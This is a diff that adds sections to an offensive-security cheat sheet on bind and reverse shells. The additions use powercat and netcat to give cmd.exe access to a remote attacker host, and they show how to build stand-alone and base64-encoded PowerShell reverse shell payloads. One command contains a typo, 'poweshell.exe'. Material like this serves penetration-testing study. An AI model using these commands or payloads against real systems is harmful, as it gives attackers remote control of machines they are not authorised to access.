@@ -22,6 +22,18 @@ powercat -l -p 7002 -ep
 powercat -c 127.0.0.1 -p 7002
 ```
 
+Set up listener on the victim machine:
+
+```
+powercat -l -p 443 -e cmd.exe
+```
+
+Connect to the victim with:
+
+```
+nc <VICTIM_IP> 443
+```
+
 ### Netcat Traditional
 
 ```
@@ -77,7 +89,39 @@ socat TCP4:IP:PORT EXEC:/bin/bash
 
 ### PowerCat
 
+{% embed url="https://github.com/besimorhino/powercat/blob/master/powercat.ps1" %}
+
+You can install powercat on Kali with:
+
+```
+sudo apt install powercat
+```
+
+The location of the script is located under:
+
+```
+/usr/share/windows-resources/powercat
+```
+
+You can perform dot-sourcing to make all variables and functions declared in the script available in the current PowerShell scope.
+
+```
+. .\powercat.ps1
+```
+
 For powercat, a payload is a set of PowerShell instructions **(Can be detected by AV and IDS)**
+
+Set up a listener:
+
+```
+sudo nc -lvp 443
+```
+
+Connect to your host:
+
+```
+powercat -c <YOUR_IP> -p 443 -e cmd.exe
+```
 
 Set up a listener:
 
@@ -104,6 +148,43 @@ powershell.exe -E asjdfasdfsdfaf
 ```
 
 Hit Enter again to execute the encoded command.
+
+We can create a stand-alone payload by adding the -g option to our command:
+
+```
+powercat -c <YOUR_IP> -p 443 -e cmd.exe -g > reverse_shell.ps1
+```
+
+Then execute the script/payload:
+
+```
+./reverse_shell.ps1
+```
+
+Alternatively, you can generate a payload using base64 encoding using the -ge option:
+
+```
+powercat -c <YOUR_IP> -p 443 -e cmd.exe -ge > base64_reverse_shell.ps1
+```
+
+Now read the file with any of these commands:
+
+```
+type base64_reverse_shell.ps1
+cat base64_reverse_shell.ps1
+```
+
+We can use the PowerShell -E (EncodedCommand) option and pass the encoded string:
+
+```
+poweshell.exe -E <base64_encoded_string>
+```
+
+Then receive the reverse shell connection:
+
+```
+sudo nc -lvnp 443
+```
 
 ### ICMP with Nishang + ICMPsh
 
